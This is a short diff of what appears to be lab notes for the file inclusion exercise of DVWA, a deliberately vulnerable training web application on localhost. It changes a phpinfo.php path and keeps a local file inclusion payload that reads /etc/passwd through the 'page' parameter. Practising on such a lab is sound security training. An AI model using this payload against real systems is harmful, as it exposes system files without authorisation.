@@ -1,4 +1,4 @@
-page=file:///var/www/html/dvwa/phpinfo.php
+page=file:///var/www/html/phpinfo.php
 
 http://localhost/vulnerabilities/fi/?page=file:///etc/passwd
 
